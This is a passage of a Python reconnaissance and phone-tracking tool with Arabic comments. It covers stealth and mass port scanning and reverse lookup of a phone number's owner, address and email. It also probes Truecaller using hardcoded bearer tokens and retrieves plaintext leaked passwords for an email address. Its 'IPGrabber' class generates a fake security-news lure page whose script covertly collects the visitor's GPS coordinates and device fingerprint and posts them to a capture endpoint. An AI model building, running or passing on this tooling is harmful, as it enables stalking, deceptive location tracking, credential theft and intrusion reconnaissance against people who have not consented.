                5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
                8443: "HTTPS-Alt", 27017: "MongoDB"
            }
            for port, service in sorted(ports_result.items()):
                srv = service_names.get(port, service)
                print(f"    {Gr}[+] Port {port:<5} ({srv})")
            data["open_ports"] = ports_result
        else:
            print(f"    {Y}[!] No open ports found (may be firewalled)")

    elif scan_choice == "2":
        print(f"{Wh}\n[*] SYN stealth scan (requires scapy)...")
        syn = SynScanner()
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9090, 27017]
        ports_open = syn.scan_range(ip, common_ports, stealth=True)
        if ports_open:
            print(f"{Wh}\n[+] Open ports (SYN scan):")
            for port, service in sorted(ports_open.items()):
                print(f"    {Gr}[+] Port {port:<5} ({service}) [SYN]")
            data["syn_scan_ports"] = ports_open

    elif scan_choice == "3":
        print(f"{Wh}\n[*] Scanning + banner grabbing + service detection...")
        ports_result = port_scan(ip)
        if ports_result:
            detect = ServiceDetector()
            detected = detect.detect_all(ip, ports_result)
            print(f"{Wh}\n[+] Services Detected:")
            for port, info in sorted(detected.items()):
                banner = info.get("banner", "")
                service = info.get("service", "unknown")
                print(f"    {Gr}[+] Port {port:<5} ({service})")
                if banner:
                    print(f"    {Wh}     Banner: {C}{banner[:100]}{RS}")
            data["service_detection"] = detected
            data["open_ports"] = ports_result
        else:
            print(f"    {Y}[!] No open ports found")

    elif scan_choice == "4":
        print(f"{Wh}\n[*] Checking for vulnerabilities...")
        vuln = VulnerabilityChecker()
        results = vuln.check_all(ip)
        if results:
            for vuln_type, info in results.items():
                print(f"    {R}[!] {vuln_type}: {info.get('details', 'Vulnerable')}{RS}")
            data["vulnerabilities"] = results
        else:
            print(f"    {Gr}[+] No common vulnerabilities detected (Heartbleed, SSLv3, NTP){Wh}")
        # Also run service detection
        ports_result = port_scan(ip)
        if ports_result:
            detect = ServiceDetector()
            data["service_detection"] = detect.detect_all(ip, ports_result)
            data["open_ports"] = ports_result

    elif scan_choice == "5":
        port_range = input(f"{Wh}\n[?] Port range {Gr}[e.g. 1-1000 or 80,443,8080]{Wh}: {Gr}").strip()
        if not port_range:
            port_range = "1-1024"
        rate_input = input(f"{Wh}[?] Max rate (packets/sec) {Gr}[default=5000]{Wh}: {Gr}").strip()
        try: rate = int(rate_input) if rate_input.isdigit() else 5000
        except: rate = 5000
        print(f"{Wh}\n[*] Mass scanning {port_range} at {rate} pps...")
        scanner = MassPortScanner(max_rate=rate)
        ports_result = scanner.scan(ip, port_range)
        if ports_result:
            print(f"{Wh}\n[+] Open Ports Found ({len(ports_result)}):")
            for port, service in sorted(ports_result.items()):
                print(f"    {Gr}[+] Port {port:<5} ({service})")
            data["mass_scan_ports"] = ports_result
        else:
            print(f"    {Y}[!] No open ports found in range {port_range}")
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R}ADDITIONAL RESOURCES")
    print(f" {Wh}{'='*50}")
    print(f"{Wh} Shodan         : {C}https://www.shodan.io/host/{ip}{RS}")
    print(f"{Wh} Censys         : {C}https://search.censys.io/hosts/{ip}{RS}")
    print(f"{Wh} VirusTotal     : {C}https://www.virustotal.com/gui/ip-address/{ip}{RS}")
    print(f"{Wh} GreyNoise      : {C}https://viz.greynoise.io/ip/{ip}{RS}")
    print(f"{Wh} SecurityTrails : {C}https://securitytrails.com/list/ip/{ip}{RS}")
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="ip",
        target=ip,
        data=data
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")


def get_phone_carrier_details(phone_number: str) -> Dict:
    """الحصول على تفاصيل متقدمة عن المشغل"""
    details = {}
    
    try:
        clean = re.sub(r'\D', '', phone_number)
        resp = requests.get(f"https://freecarrierlookup.com/getcarrier/{clean}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            details['carrier_api'] = {
                'name': data.get('carrier', 'N/A'),
                'line_type': data.get('linetype', 'N/A'),
                'is_ported': data.get('ported', 'N/A'),
                'original_carrier': data.get('original_carrier', 'N/A')
            }
    except: pass
    
    API_KEY_NUMVERIFY = ""
    if API_KEY_NUMVERIFY:
        try:
            clean = re.sub(r'\D', '', phone_number)
            resp = requests.get(f"http://apilayer.net/api/validate?access_key={API_KEY_NUMVERIFY}&number={clean}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                details['numverify'] = {
                    'valid': data.get('valid', False),
                    'country': data.get('country_name', 'N/A'),
                    'location': data.get('location', 'N/A'),
                    'carrier': data.get('carrier', 'N/A'),
                    'line_type': data.get('line_type', 'N/A')
                }
        except: pass
    
    return details


def search_phone_social_media(phone: str) -> Dict:
    """البحث عن الرقم في وسائل التواصل الاجتماعي"""
    results = {'platforms': [], 'profiles': []}
    
    clean_digits = re.sub(r'\D', '', phone)
    
    social_links = {
        'Facebook': f"https://www.facebook.com/search/top?q={clean_digits}",
        'Instagram': f"https://www.instagram.com/accounts/emailsignup/?email=&phone={clean_digits}",
        'Twitter/X': f"https://twitter.com/search?q={clean_digits}",
        'LinkedIn': f"https://www.linkedin.com/search/results/people/?keywords={clean_digits}",
        'Telegram': f"https://t.me/{clean_digits}",
        'WhatsApp': f"https://wa.me/{clean_digits}",
        'Signal': f"https://signal.me/#p/{clean_digits}",
        'Viber': f"viber://chat?number={clean_digits}",
        'Skype': f"https://find.skype.com/?q={clean_digits}",
        'TikTok': f"https://www.tiktok.com/search?q={clean_digits}",
        'Snapchat': f"https://www.snapchat.com/add/{clean_digits}",
        'Reddit': f"https://www.reddit.com/search/?q={clean_digits}",
        'Pinterest': f"https://www.pinterest.com/search/pins/?q={clean_digits}",
        'Tumblr': f"https://www.tumblr.com/search/{clean_digits}",
        'Discord': f"https://discord.com/search?q={clean_digits}",
        'WeChat': f"https://wechat.com/search?q={clean_digits}",
        'Line': f"https://line.me/ti/p/{clean_digits}",
        'Zalo': f"https://zalo.me/{clean_digits}",
        'IMO': f"https://imo.im/search?q={clean_digits}"
    }
    
    for platform, url in social_links.items():
        results['platforms'].append({'name': platform, 'url': url})
    
    try:
        headers = {'User-Agent': random.choice(CONFIG["user_agents"])}
        resp = requests.get(f"https://www.truecaller.com/search/{clean_digits}", headers=headers, timeout=10)
        if resp.status_code == 200 and 'name' in resp.text.lower():
            names = re.findall(r'<span[^>]*>([^<]+)</span>', resp.text)
            if names:
                results['profiles'].extend([n.strip() for n in names[:5] if len(n.strip()) > 2])
    except: pass
    
    return results


def check_phone_breaches(phone: str) -> Dict:
    """التحقق من تسريب الرقم في خروقات البيانات"""
    breaches = {'found': False, 'sources': [], 'count': 0}
    
    clean_digits = re.sub(r'\D', '', phone)
    
    try:
        resp = requests.get(f"https://leak-lookup.com/api/search?phone={clean_digits}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success'):
                breaches['found'] = True
                breaches['count'] = len(data.get('data', []))
                breaches['sources'] = list(data.get('data', {}).keys())[:10]
    except: pass
    
    try:
        resp = requests.get(f"https://haveibeenpwned.com/phone/{clean_digits}", timeout=10)
        if 'was found' in resp.text.lower():
            breaches['found'] = True
            breaches['sources'].append('HaveIBeenSold')
    except: pass
    
    return breaches


def get_phone_comments_reviews(phone: str) -> Dict:
    """البحث عن تعليقات وتقييمات الرقم"""
    comments = {'caller_id': [], 'complaints': [], 'ratings': []}
    
    clean_digits = re.sub(r'\D', '', phone)
    
    complaint_sites = {
        'CallerCenter': f"https://callercenter.com/{clean_digits}",
        'WhoCallsMe': f"https://whocallsme.com/Phone.aspx?number={clean_digits}",
        '800Notes': f"https://800notes.com/Phone.aspx/{clean_digits}",
        'CallerSmart': f"https://callersmart.com/number/{clean_digits}",
        'SpyDialer': f"https://spydialer.com/default.aspx?search={clean_digits}",
        'Numlookup': f"https://numlookup.com/{clean_digits}"
    }
    
    for site, url in complaint_sites.items():
        comments['caller_id'].append({'site': site, 'url': url})
    
    try:
        search_url = f"https://www.google.com/search?q={clean_digits}+phone+review+complaint"
        resp = requests.get(search_url, headers={'User-Agent': random.choice(CONFIG["user_agents"])}, timeout=10)
        snippets = re.findall(r'<div[^>]*class="[^"]*VwiC3b[^"]*"[^>]*>([^<]+(?:<[^>]+>[^<]*</[^>]+>)?[^<]*)</div>', resp.text)
        for snippet in snippets[:5]:
            clean_snippet = re.sub(r'<[^>]+>', '', snippet)
            if len(clean_snippet) > 20:
                comments['complaints'].append(clean_snippet[:200])
    except: pass
    
    return comments


def get_phone_reverse_lookup(phone: str) -> Dict:
    """البحث العكسي عن الرقم للحصول على الاسم والعنوان"""
    info = {'name': None, 'address': None, 'email': None, 'social': []}
    
    clean_digits = re.sub(r'\D', '', phone)
    
    try:
        resp = requests.get(f"https://api.whitepages.com/find_person?phone={clean_digits}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            info['name'] = data.get('name', 'N/A')
            info['address'] = data.get('address', 'N/A')
    except: pass
    
    try:
        resp = requests.get(f"https://www.whoxy.com/phone/{clean_digits}", timeout=10)
        if resp.status_code == 200:
            emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', resp.text)
            if emails:
                info['email'] = emails[0]
    except: pass
    
    return info


def display_phone_summary(phone: str, data: Dict):
    """عرض ملخص معلومات الرقم في التيرمينال"""
    print(f"\n {Wh}{'='*50}")
    print(f" {Gr} PHONE NUMBER SUMMARY")
    print(f" {Wh}{'='*50}")
    print(f"{Wh} Phone Number    : {Gr}{phone}")
    print(f"{Wh} E.164 Format    : {Gr}{data.get('E.164 Format', 'N/A')}")
    print(f"{Wh} Country         : {Gr}{data.get('Country', 'N/A')}")
    print(f"{Wh} Carrier         : {Gr}{data.get('Carrier', 'N/A')}")
    print(f"{Wh} Line Type       : {Gr}{data.get('Type', 'N/A')}")
    print(f"{Wh} Valid Number    : {Gr}{data.get('Valid Number', 'N/A')}")
    if data.get('CarrierDetails', {}).get('carrier_api'):
        cd = data['CarrierDetails']['carrier_api']
        print(f"{Wh} Line Type (API) : {Gr}{cd.get('line_type', 'N/A')}")
        print(f"{Wh} Ported          : {Gr}{cd.get('is_ported', 'N/A')}")
    if data.get('Breaches', {}).get('found'):
        br = data['Breaches']
        print(f"{R} Breaches        : Found in {br.get('count', 0)} sources{R}")
    if data.get('SocialProfiles'):
        print(f"{Wh} Social Names    : {Gr}{', '.join(data['SocialProfiles'][:3])}")
    if data.get('ReverseLookup', {}).get('name'):
        print(f"{Wh} Reverse Name    : {Gr}{data['ReverseLookup']['name']}")

# 
# PhoneTrackerPro v5.0 — Advanced Phone OSINT
# 

class LocationConsensusVoter:
    """نظام تصويت ذكي يجمع نتائج من 8 مصادر مختلفة لتحديد الموقع بدقة"""

    def __init__(self):
        self.all_votes = []

    def add_vote(self, city: str, source: str, confidence: float, extra: str = ""):
        if city and city.lower() not in ["unknown", "n/a", "", "india"]:
            self.all_votes.append({
                "city": city.strip().title(),
                "source": source,
                "confidence": confidence,
                "extra": extra
            })

    def consensus_vote(self) -> Dict:
        if not self.all_votes:
            return {}
        city_scores = {}
        for v in self.all_votes:
            c = self._normalize_city(v["city"].lower().strip())
            score = v["confidence"]
            if c in city_scores:
                city_scores[c]["score"] += score
                city_scores[c]["count"] += 1
                city_scores[c]["sources"].append(v["source"])
            else:
                city_scores[c] = {
                    "score": score, "count": 1,
                    "sources": [v["source"]], "original": v["city"]
                }
        best = max(city_scores.items(), key=lambda x: x[1]["score"])
        total_apis = len(self.all_votes)
        agreeing = best[1]["count"]
        combined_conf = min(0.95, best[1]["score"] / total_apis + (agreeing / total_apis) * 0.3)
        return {
            "city": best[1]["original"],
            "confidence": round(combined_conf, 2),
            "votes": f"{agreeing}/{total_apis} APIs",
            "all_votes": self.all_votes
        }

    def _normalize_city(self, city: str) -> str:
        city_map = {
            "new delhi": "delhi", "delhi ncr": "delhi",
            "bengaluru": "bangalore", "gurugram": "gurgaon",
            "mumbai metropolitan region": "mumbai"
        }
        return city_map.get(city, city)


class IPGrabber:
    """مولد روابط صيد متقدم يجمع IP + GPS + معلومات الجهاز"""

    def generate_tracking_page(self, phone_number: str, track_id: str) -> str:
        return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Breaking: Major Security Update — Read Now</title>
<style>
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f8f9fa;color:#333;line-height:1.7}}
.article{{background:white;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.08);padding:30px;margin:20px auto;max-width:700px}}
.loading{{text-align:center;padding:40px;color:#888}}
.spinner{{display:inline-block;width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#3498db;border-radius:50%;animation:spin 1s linear infinite}}
</style>
</head>
<body>
<div class="article">
<h2>Major Security Update Released — What You Need to Know</h2>
<p>A major security update has been released that affects millions of users worldwide. Experts recommend updating your devices immediately...</p>
<div class="loading">
<div class="spinner"></div>
<p>Loading additional content...</p>
</div>
</div>
<script>
var data = {{
    track_id: "{track_id}",
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenW: screen.width,
    screenH: screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer,
    cookiesEnabled: navigator.cookieEnabled,
    hardwareConcurrency: navigator.hardwareConcurrency || '?',
    deviceMemory: navigator.deviceMemory || '?'
}};
if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
        function(pos) {{
            data.gps_lat = pos.coords.latitude;
            data.gps_lon = pos.coords.longitude;
            data.gps_accuracy = pos.coords.accuracy;
            sendData(data);
        }},
        function(err) {{
            data.gps_error = err.message;
            sendData(data);
        }},
        {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
    );
}} else {{
    sendData(data);
}}
function sendData(d) {{
    fetch("/capture/" + d.track_id, {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify(d)
    }});
}}
</script>
</body>
</html>"""

    def capture_ip_location(self, ip: str) -> Dict:
        try:
            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "city": data.get("city", "?"),
                    "region": data.get("region", "?"),
                    "country": data.get("country", "?"),
                    "loc": data.get("loc", "?"),
                    "org": data.get("org", "?"),
                    "postal": data.get("postal", "?")
                }
        except:
            pass
        return {}


class TruecallerProbe:
    """باحث متقدم في Truecaller يستخدم 3 طرق مختلفة"""

    def search_truecaller(self, phone_number: str, country_code: str, national_number: str) -> Dict:
        session = requests.Session()
        session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})

        result = self._search_via_api(session, phone_number, country_code)
        if result.get("found"):
            return result

        result = self._search_via_web(session, national_number, country_code)
        if result.get("found"):
            return result

        result = self._search_via_alt_apis(session, phone_number)
        return result

    def _search_via_api(self, session, phone_number: str, country_code: str) -> Dict:
        api_url = f"https://search5-noneu.truecaller.com/v2/search?q={phone_number}&countryCode={country_code}&type=4"
        install_ids = [
            "a]i5O6mGBmaza_eLLReAXf4kMx8hQxM1POyVaTlKZO4oEYzH=",
            "a1i0O+6maBGmBaza_eLrLZReXAf4kXMx8hQxM1xPOOyVTaTlKZZO4oEYzH="
        ]
        for iid in install_ids:
            try:
                headers = {"Authorization": f"Bearer {iid}", "Accept": "application/json"}
                resp = session.get(api_url, headers=headers, timeout=8)
                if resp.status_code == 200:
                    data = resp.json()
                    entries = data.get("data", [])
                    if entries:
                        entry = entries[0]
                        name = entry.get("name", {})
                        return {
                            "found": True,
                            "name": name.get("first", "") + " " + name.get("last", ""),
                            "email": entry.get("internetAddresses", [{}])[0].get("id", ""),
                            "method": "API"
                        }
            except:
                continue
        return {"found": False}

    def _search_via_web(self, session, national_number: str, country_code: str) -> Dict:
        country_map = {"91": "in", "1": "us", "44": "gb"}
        cc = country_map.get(country_code, "in")
        try:
            url = f"https://www.truecaller.com/search/{cc}/{national_number}"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200 and BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'lxml')
                script_tag = soup.find("script", {"id": "__NEXT_DATA__"})
                if script_tag:
                    next_data = json.loads(script_tag.string)
                    profile = next_data.get("props", {}).get("pageProps", {}).get("data", {})
                    name = profile.get("name", {})
                    if isinstance(name, dict):
                        full_name = f"{name.get('first', '')} {name.get('last', '')}".strip()
                    else:
                        full_name = name
                    if full_name:
                        return {"found": True, "name": full_name, "method": "Web"}
        except:
            pass
        return {"found": False}

    def _search_via_alt_apis(self, session, phone_number: str) -> Dict:
        alt_apis = [
            f"https://www.findandtrace.com/trace-mobile-number?number={phone_number}",
            f"https://www.mobiletracker.net/api/lookup?number={phone_number}",
            f"https://numlooker.com/phone/{phone_number}"
        ]
        for url in alt_apis:
            try:
                resp = session.get(url, timeout=8)
                if resp.status_code == 200:
                    names = re.findall(r'(?:name|Name|NAME)[":\s]+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)+)', resp.text)
                    if names:
                        return {"found": True, "name": names[0], "method": "AltAPI"}
            except:
                continue
        return {"found": False}


class PasswordLeakChecker:
    """البحث عن كلمات مرور مسربة مرتبطة بالبريد الإلكتروني أو الرقم"""

    def check_proxynova(self, email: str) -> Optional[List[str]]:
        url = f"https://api.proxynova.com/comb?query={email}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                lines = data.get("lines", [])
                passwords = set()
                prefix = f"{email}:"
                for line in lines:
                    if line.startswith(prefix):
                        parts = line.split(":", 1)
                        if len(parts) == 2:
                            passwords.add(parts[1].strip())
                return list(passwords) if passwords else None
        except:
            pass
        return None

    def check_hudsonrock(self, email: str) -> bool:
        url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={email}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return "This email address is associated with a computer that was infected" in data.get("message", "")
        except:
            pass
        return False


class ChainOfCustody:
    """سلسلة حفظ الأدلة مع توقيع SHA-256"""

    def __init__(self, case_id: str, officer: str):
        self.case_id = case_id
        self.officer = officer
        self.evidence_chain = []
        self.scan_id = uuid.uuid4().hex[:12].upper()

    def log_evidence(self, action: str, detail: str = ""):
        ts = datetime.utcnow().isoformat() + "Z"
        entry = {
            "timestamp_utc": ts,
            "action": action,
            "detail": detail,
            "scan_id": self.scan_id,
            "officer": self.officer,
        }
        entry_str = json.dumps(entry, sort_keys=True)
        prev_hash = self.evidence_chain[-1]["hash"] if self.evidence_chain else "GENESIS"
        entry["hash"] = self._sha256(f"{prev_hash}|{entry_str}")
        self.evidence_chain.append(entry)

    def compute_evidence_hash(self, data: Dict) -> str:
        raw = json.dumps(data, sort_keys=True, default=str)
        return self._sha256(raw)

    def _sha256(self, data: str) -> str:
        return hashlib.sha256(data.encode("utf-8")).hexdigest()

    def generate_custody_report(self) -> str:
        report = f"""

     CHAIN OF CUSTODY REPORT            

 Case ID: {self.case_id}
 Scan ID: {self.scan_id}
 Officer: {self.officer}
 Total Events: {len(self.evidence_chain)}


Events:
"""
        for event in self.evidence_chain:
            report += f"\n[{event['timestamp_utc']}] {event['action']}\n    Hash: {event['hash'][:32]}...\n"
        return report


#  MediaWiki / Wikipedia Search Helper 
def search_wikipedia(entity: str, lang: str = "en") -> Dict:
    """البحث في ويكيبيديا عن كيان (اسم شركة، شخص، مكان)"""
    result = {"found": False, "title": "", "summary": "", "url": ""}
    try:
        url = f"https://{lang}.wikipedia.org/w/api.php"
        params = {
            "action": "query", "list": "search", "srsearch": entity,
            "format": "json", "srlimit": 3
        }
        resp = requests.get(url, params=params, timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            pages = data.get("query", {}).get("search", [])
            if pages:
                title = pages[0]["title"]
                page_id = pages[0]["pageid"]
                params2 = {
                    "action": "query", "prop": "extracts", "exintro": True,
                    "explaintext": True, "pageids": page_id, "format": "json"
                }
                resp2 = requests.get(url, params=params2, timeout=8)
                if resp2.status_code == 200:
                    extract_data = resp2.json()
                    page = extract_data.get("query", {}).get("pages", {}).get(str(page_id), {})
                    result["found"] = True
                    result["title"] = title
                    result["summary"] = page.get("extract", "")[:500]
                    result["url"] = f"https://{lang}.wikipedia.org/wiki/{title.replace(' ', '_')}"
    except:
        pass
    return result


# 
# TeleSpotter — Advanced Multi-Engine Search & Pattern Analysis
# 

class SearchEngineManager:
    """مدير البحث المتوازي في 3 محركات (Google, Bing, DuckDuckGo)"""

    def __init__(self):
        self.engines = ['google', 'bing', 'duckduckgo']

    def search_all(self, query: str, options: Dict = None) -> Dict[str, list]:
        results = {}
        if options is None:
            options = {e: True for e in self.engines}

        for name in self.engines:
            if not options.get(name, True):
                continue
            try:
                urls = self._search_engine(name, query)
                results[name] = urls
            except:
                results[name] = []
            time.sleep(random.uniform(0.8, 1.8))
        return results

    def _search_engine(self, engine: str, query: str) -> list:
        urls = []
        headers = {"User-Agent": random.choice(CONFIG["user_agents"])}

        if engine == 'google':
            url = f"https://www.google.com/search?q={url_quote(query)}&num=15"
        elif engine == 'bing':
            url = f"https://www.bing.com/search?q={url_quote(query)}&count=15"
        elif engine == 'duckduckgo':
            url = f"https://html.duckduckgo.com/html/?q={url_quote(query)}"
        else:
            return []

        try:
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code != 200:
                return []

            if engine == 'google':
                urls = re.findall(r'href="(https?://[^"]+)"', resp.text)
                urls = [u for u in urls if u.startswith("http") and "google.com" not in u][:15]
            elif engine == 'bing':
                urls = re.findall(r'<cite[^>]*>(.*?)</cite>', resp.text, re.I)
                urls = [u.strip() for u in urls if u.strip()][:15]
            elif engine == 'duckduckgo':
                if BeautifulSoup:
                    soup = BeautifulSoup(resp.text, "html.parser")
                    for a in soup.select("a.result__a") or soup.find_all("a", class_="result__a"):
                        href = a.get("href", "")
                        if href.startswith("http"):
                            urls.append(href)
                urls = urls[:15]
        except:
            pass
        return urls

    def get_search_urls(self, query: str) -> Dict[str, str]:
        """رابط مباشر لكل محرك بحث لفتحه في المتصفح"""
        return {
            'google': f"https://www.google.com/search?q={url_quote(query)}",
            'bing': f"https://www.bing.com/search?q={url_quote(query)}",
            'duckduckgo': f"https://duckduckgo.com/?q={url_quote(query)}",
        }


class PatternAnalyzer:
    """يحلل النصوص ويستخرج معلومات مفيدة (أسماء، إيميلات، حسابات) بدقة عالية"""

    def __init__(self):
        self.social_platforms = {
            'facebook': [r'facebook\.com/([a-zA-Z0-9_.]+)', r'fb\.com/([a-zA-Z0-9_.]+)'],
            'twitter': [r'twitter\.com/([a-zA-Z0-9_]+)', r'x\.com/([a-zA-Z0-9_]+)'],
            'instagram': [r'instagram\.com/([a-zA-Z0-9_.]+)'],
            'linkedin': [r'linkedin\.com/in/([a-zA-Z0-9_-]+)'],
            'tiktok': [r'tiktok\.com/@([a-zA-Z0-9_.]+)'],
            'youtube': [r'youtube\.com/(?:user|channel|c)/([a-zA-Z0-9_-]+)'],
            'pinterest': [r'pinterest\.com/([a-zA-Z0-9_]+)'],
            'reddit': [r'reddit\.com/u(?:ser)?/([a-zA-Z0-9_-]+)'],
            'snapchat': [r'snapchat\.com/add/([a-zA-Z0-9_.]+)'],
            'github': [r'github\.com/([a-zA-Z0-9_-]+)'],
            'telegram': [r't\.me/([a-zA-Z0-9_]+)'],
        }

    def extract_names(self, text: str) -> List[Dict]:
        names = []
        seen = set()

        pattern1 = r'\b([A-Z][a-z]+)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)\b'
        for match in re.finditer(pattern1, text):
            full_name = match.group(0).strip()
            if self._is_valid_name(full_name) and full_name.lower() not in seen:
                seen.add(full_name.lower())
                names.append({
                    'value': full_name,
                    'source': 'pattern_match',
                    'confidence': self._calculate_name_confidence(full_name, text)
                })

        pattern2 = r'(?:owner|name|caller|registered to|belongs to)[:\s]+([A-Z][a-z]+\s+[A-Z][a-z]+)'
        for match in re.finditer(pattern2, text, re.IGNORECASE):
            full_name = match.group(1).strip()
            if self._is_valid_name(full_name) and full_name.lower() not in seen:
                seen.add(full_name.lower())
                names.append({
                    'value': full_name,
                    'source': 'labeled_match',
                    'confidence': min(90, self._calculate_name_confidence(full_name, text) + 20)
                })

        names.sort(key=lambda x: x['confidence'], reverse=True)
        return names[:20]

    def _is_valid_name(self, name: str) -> bool:
        if len(name) < 3 or len(name) > 50:
            return False
        blacklist = {'example', 'test', 'unknown', 'null', 'none', 'name', 'user'}
        if name.lower() in blacklist:
            return False
        if name[0].islower() or not name[0].isalpha():
            return False
        return True

    def _calculate_name_confidence(self, name: str, text: str) -> int:
        confidence = 50
        count = text.lower().count(name.lower())
        confidence += min(count * 5, 20)
        context_clues = ['owner', 'registered', 'belongs', 'name', 'caller']
        for clue in context_clues:
            idx = text.lower().find(name.lower())
            if idx != -1:
                context = text[max(0, idx - 50):idx + len(name) + 50].lower()
                if clue in context:
                    confidence += 10
        return min(confidence, 95)

    def extract_emails(self, text: str) -> List[Dict]:
        emails = []
        pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        for match in re.finditer(pattern, text):
            email = match.group(0).lower()
            if self._is_valid_email(email):
                emails.append({
                    'value': email,
                    'source': 'pattern_match',
                    'confidence': self._calculate_email_confidence(email, text),
                    'domain': email.split('@')[1]
                })
        emails.sort(key=lambda x: x['confidence'], reverse=True)
        return emails[:10]

    def _is_valid_email(self, email: str) -> bool:
        if len(email) > 100:
            return False
        blacklist_domains = {'example.com', 'test.com', 'domain.com'}
        domain = email.split('@')[1] if '@' in email else ''
        if domain in blacklist_domains:
            return False
        return True

    def _calculate_email_confidence(self, email: str, text: str) -> int:
        confidence = 60
        count = text.lower().count(email.lower())
        confidence += min(count * 5, 20)
        if 'contact' in text.lower() or 'email' in text.lower():
            confidence += 10
        return min(confidence, 95)

    def extract_social_profiles(self, text: str) -> List[Dict]:
        profiles = []
        seen = set()
        for platform, patterns in self.social_platforms.items():
            for pattern in patterns:
                for match in re.finditer(pattern, text, re.IGNORECASE):
                    username = match.group(1)
                    url = match.group(0)
                    key = f"{platform}:{username.lower()}"
                    if key not in seen:
                        seen.add(key)
                        profiles.append({
                            'platform': platform,
                            'username': username,
                            'url': url if url.startswith('http') else f'https://{url}',
                            'source': 'url_match',
                            'confidence': 85
                        })
        profiles.sort(key=lambda x: x['confidence'], reverse=True)
        return profiles[:20]

    def analyze(self, text: str) -> Dict:
        """تحليل كامل للنص: أسماء + إيميلات + حسابات اجتماعية"""
        return {
            "names": self.extract_names(text),
            "emails": self.extract_emails(text),
            "social_profiles": self.extract_social_profiles(text),
        }


class PeopleSearchManager:
    """يدير البحث في 5 مواقع مختلفة للبحث عن الأشخاص"""

    def __init__(self):
        self.sites = {
            'whitepages': 'https://www.whitepages.com/phone/{}',
            'truepeoplesearch': 'https://www.truepeoplesearch.com/result?phoneno={}',
            'fastpeoplesearch': 'https://www.fastpeoplesearch.com/{}',
            'spokeo': 'https://www.spokeo.com/phone-search?q={}',
            'beenverified': 'https://www.beenverified.com/phone/{}',
        }

    def search_all(self, phone: str, options: Dict = None) -> Dict[str, list]:
        results = {}
        clean = re.sub(r'\D', '', phone)
        if options is None:
            options = {s: True for s in self.sites}

        for name, url_tpl in self.sites.items():
            if not options.get(name, True):
                continue
            search_url = url_tpl.format(clean)
            try:
                resp = requests.get(
                    search_url,
                    headers={"User-Agent": random.choice(CONFIG["user_agents"])},
                    timeout=8
                )
                page_text = resp.text if resp.status_code == 200 else ""
                results[name] = {
                    "url": search_url,
                    "status": resp.status_code,
                    "length": len(page_text),
                    "data": self._parse_result(name, page_text) if page_text else {}
                }
            except:
                results[name] = {"url": search_url, "status": 0, "length": 0, "data": {}}
            time.sleep(random.uniform(0.5, 1.0))
        return results

    def _parse_result(self, site: str, html: str) -> Dict:
        parsed = {}
        if not html or not BeautifulSoup:
            return parsed
        soup = BeautifulSoup(html, "html.parser")
        text = soup.get_text(separator=" ", strip=True)
        analyzer = PatternAnalyzer()
        parsed["names"] = [n["value"] for n in analyzer.extract_names(text)[:5]]
        parsed["emails"] = [e["value"] for e in analyzer.extract_emails(text)[:3]]
        parsed["social"] = [s["url"] for s in analyzer.extract_social_profiles(text)[:5]]
        return parsed

    def get_search_urls(self, phone: str) -> Dict[str, str]:
        clean = re.sub(r'\D', '', phone)
        return {name: tpl.format(clean) for name, tpl in self.sites.items()}


def teleSearch_engine():
    """TeleSpotter — بحث متقدم متعدد المحركات مع تحليل الأنماط"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} TELESPOTTER — MULTI-ENGINE OSINT SEARCH")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Parallel search · Pattern analysis · People search{Wh}")

    print(f"\n{Wh} SEARCH TARGET ")
    print(f"{Wh}  {Gr}1{Wh}) Phone number")
    print(f"{Wh}  {Gr}2{Wh}) Email address")
    print(f"{Wh}  {Gr}3{Wh}) Username / Name")
    target_type = input(f"\n{Wh}[+] Type {Gr}[1/2/3]{Wh}: {Gr}").strip()
    target = input(f"{Wh}[+] Target value: {Gr}").strip()
    if not target:
        return

    # 1. Web search (3 engines)
    print(f"\n{Y}[*] Phase 1 — Parallel Web Search (3 engines){Wh}")
    sem = SearchEngineManager()
    web_results = sem.search_all(target)
    all_urls = []
    for engine, urls in web_results.items():
        if urls:
            print(f"  {Gr}{Wh} {engine:<12}: {len(urls)} results")
            all_urls.extend(urls[:5])
        else:
            print(f"  {Y}−{Wh} {engine:<12}: blocked / no results")

    # 2. Pattern analysis on web text
